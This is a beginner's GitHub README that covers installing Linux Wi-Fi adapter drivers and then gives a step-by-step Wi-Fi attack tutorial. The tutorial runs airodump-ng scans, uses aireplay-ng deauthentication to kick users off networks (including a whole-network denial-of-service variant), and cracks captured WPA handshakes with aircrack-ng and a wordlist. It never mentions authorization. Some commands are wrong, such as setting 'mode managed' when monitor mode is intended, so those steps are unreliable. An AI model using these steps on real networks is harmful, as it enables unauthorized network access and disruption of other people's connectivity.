# Installation of Wi-fi DRIVES 
Download Driver tar file from above on your system 


## install

Go to you download dir where it is install 

```bash
  cd Download
```
## Extract it
extract it manual or use :
```bash
  tar -xjvf compact-wireless-2010–06–26-p.tar.bz2
```
go inside the dir of compact-wireless
```bash
cd compat-wireless-2010–06–26-p
```
Run both the commands  :
```bash
sudo make unload 
```
```bash
sudo make load 
```
## Restart your system 
```bash
init 6
```
## Check is it working or not 
type to check wlan0 or wlan1 interface showing or not
```bash
iwconfig
```
#  installation of Adapter DRIVERS 
In my case im using TP-LINK Archer T2U Plus AC600 

![tp-link adapter](https://github.com/Esther7171/web-development/assets/122229257/257d5af9-d9b3-40f3-b7fe-298c0fe03918)

## Why should i buy this adapter ?
This adapter has a Realtek RTL8821AU Chipset . It will cost u ₹1,100 or maybe less . it have a good range and It support in linux community and has driver for Kali linux , Parrot OS .etc Archer T2U Plus is on sale under 1000 INR , which is a very affordable price and it too good in my opinion for Beginners in Pentesting.
## Where to buy

👉[Amazon](https://www.amazon.in/TP-Link-Wireless-Adapter-Archer-T2U/dp/B07P681N66?th=1)

👉[Flipkart](https://www.flipkart.com/tp-link-ac600-t2u-plus-usb-adapter/p/itmfhz7zg85hgtzg?marketplace=FLIPKART&iid=79034678-e8a7-4d71-8d97-073f9497fcdc.USBFHZ7ZPWFHW8YW.SEARCH&ppt=sp&lid=LSTUSBFHZ7ZPWFHW8YW9SRRQK&srno=s_1_1&qH=2fca2860d6b488dc&pid=USBFHZ7ZPWFHW8YW&affid=amaledasse&ssid=7o14gihn8ag5p98g1609082867282&otracker1=search&ppn=sp)

## To install tp-link T2U plus Driver for Debian Based Linux Distros (Ubuntu/Kali Linux)(x86_64) :

1. Update the package information :
```bash
sudo apt update -y 
```
2. Install dkms and git :
```bash
sudo apt install dkms git
```
3. Install Build Dependencies :
```bash
sudo apt install build-essential libelf-dev linux-headers-$(uname -r)
```
4. Download the Driver files using git :
```bash
git clone https://github.com/aircrack-ng/rtl8812au.git
```
5. Navigate to the Downloaded directory :
```bash
cd rtl88*
```
6. Install the Driver
```bash
sudo make dkms_install
```
7. Check the wireless interfaces by typing :
```bash
lsusb
```        
## or
```bash
iwconfig
```    
## 8. Uninstall Driver in Linux :
* Check the module name and version using the command sudo dkms status.
```bash
$ dkms status  
8812au, 5.6.4.2_35491.20191025, 5.10.63+, armv6l: installed  
rtl8188fu, 1.0, 5.10.63+, armv6l: installed.
```
* here module name is 8812au and module version is 5.6.4.2_35491.20191025.
* use
```bash  
sudo dkms remove <module>/<module-version>.
```
```bash
$ sudo dkms remove 8812au/5.6.4.2_35491.20191025 --all  

Deleting module version: 5.6.4.2_35491.20191025 completely from the DKMS tree.  

Done.  
```
* delete this file using sudo rm -rf /var/lib/dkms/8812au/.

----------------------------------------------------------

# Wi-Fi Hacking Tutorial for beginners

# step 1. Monitor mode 
#### First you need adapter who's support Monitor mode && packet injection if u using this TP-link T2U plus. So ur ready

## give root permision so it more comfortable :
```bash
sudo sudo
su root
```
## Using iwconfig check wheather adapter is Managed  mode or Monitor mode. 

```bash
iwconfig
``` 
## hmm i know it on Managed mode
![Screenshot 2023-10-17 214221](https://github.com/Esther7171/web-development/assets/122229257/e86417f9-d99a-4b11-b222-876c1b25b9fb)



#  1. Kill all background process to do it (it dissconnect ur network so don't get panic) :
```bash
airmon-ng check kill
``` 
* wlan0 => interface name .
* WIFI@REALTEK => Is wlan0 nickname u can use both but reccommended wlan0.
* if u have already connected to wifi sometime it show wlan1 or wlan2 rather than wlna0 (in case u have 2 adpater 1 for wifi and second to attack)
## 2. bring interface down to make it Monitor mode
```bash
ifconfig wlan0 down
``` 
## 3. to make it Monitormode
```bash
iwconfig wlan0 mode managed 
``` 
## 4. bring interface up again :
```bash
ifconfig wlan0 up
``` 
## 5. Now its on monitor mode check using :
```bash
iwconfig 
``` 
![Screenshot 2023-10-17 221254](https://github.com/Esther7171/web-development/assets/122229257/f754b3a2-9844-463b-8896-0b5ba3c05d3d)

# 2. Or not doing all this time wast u can do Directly this Monitor mode by usning  😁 :
```bash
airmon-ng start wlan0   
``` 
![Screenshot 2023-10-17 221157](https://github.com/Esther7171/web-development/assets/122229257/1865dd19-d01a-47b3-b7f9-74f6d9750af2)

# step 2. Check for nearby network
## to check use :
# it will show u all routers
```bash
airodump-ng wlan0   
```  

### ctrl + c =>  to stop 
![Screenshot 2023-10-17 221340](https://github.com/Esther7171/web-development/assets/122229257/dd887d5b-5665-46e8-9a21-8149062b33ca)


* Copy bssid ofnetwork u like (bssid = mac address show on first row)
*  also note the ch (channel number of same router)

# step 3. To get that router 

* --bssid => whom u going to attack
* --channel => to give channel number if it or use [(-c) for channel but sometime it didn't work well ]
* station => is the device connectedto router.
![Screenshot 2023-10-17 221650](https://github.com/Esther7171/web-development/assets/122229257/9bc23ec6-1f6a-4916-8ca4-52262d0e6699)

* --write => to creat a file where my handshake store
```bash
airodump-ng wlan0 --bssid --channel --write /path/Meow.txt
```
```bash
airodump-ng wlan0 --bssid -c -w /path/Meow.txt
```
## for an example
```bash
airodump-ng wlan0 --bssid 3C:46:45:1D:5D:31 --channel 11  -w /home/death/text
```

![Screenshot 2023-10-17 221855](https://github.com/Esther7171/web-development/assets/122229257/e9ec3986-5e54-4bf3-9345-d90fc7057e33)


# step 4. kick off people form there network / deauthentication attack

* aireplay-ng is powerfull we using itfor deauth people and capture handshake when they try to reconnect.
* -a => router mac addrs.
* -c => device connected with router we going to deauthenticate.
* --deauth / -0 => to send number of deauth packeges.
```bash
aireplay-ng wlan0 -a -c  --deauth 10
```  
```bash
aireplay-ng wlan0 -a <bssid> -c <station>  -0 <number of packages>
```  
## for example 
```bash
aireplay-ng wlan0 -a 3C:46:45:1D:5D:31 -c D4:36:89:A4:7R:29 --deauth 10
```  
# To dos on whole network use :
```bash
aireplay-ng wlan0 -a <bssid> -0 <deauth n.o packages>
```
# step 5. Crack the password / handshake file.
### To crack capture handshake we using aircrack-ng fast cracking tool
* -w to give wordlist.
* u got so many file but we need .cap file where handshake stored.
* if it not deauth another device.
* gzip -d /usr/share/wordlist/rockyou.txt (if it not)
![Screenshot 2023-10-17 225232](https://github.com/Esther7171/web-development/assets/122229257/c4fc707b-c3d0-46e4-a3b3-67bc1a041360)
 ```bash
aircrack-ng text.cap -w /usr/share/rockyou.txt
```

![Screenshot 2023-10-17 225248](https://github.com/Esther7171/web-development/assets/122229257/760fda9a-b63c-4b78-a45d-b087561de64a)
* when it will crack it shou the password.

## Features
- install wlan0
- Kali , parrot ubuntu install Wi-fi drivers.
- enable Monitor mode.
- Scan localarea wifi networks.
- deauth devices.
- capture handshake file.
- crack handshake ushing aircrack


## Other Common Github Profile Sections
👩‍💻 I'm currently student

🧠 I'm currently learning more C.E.H

👯‍♀️ to be honest i take help of @nlkguy credit to him as well.

🤔 i though to combine all so it easy for begginer bez at start i didn't find a proper tutorial.

💬 Ask me about...  "Nothing"

📫 How to reach me... "@deathesther" instagram only please


⚡️ nothing much to write

## For queerys u can ask me on my instagram
@deathesther    
my username
 ## Badges

just for fun i use this on tested purpose hehehehe

[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
[![GPLv3 License](https://img.shields.io/badge/License-GPL%20v3-yellow.svg)](https://opensource.org/licenses/)
[![AGPL License](https://img.shields.io/badge/license-AGPL-blue.svg)](http://www.gnu.org/licenses/agpl-3.0)

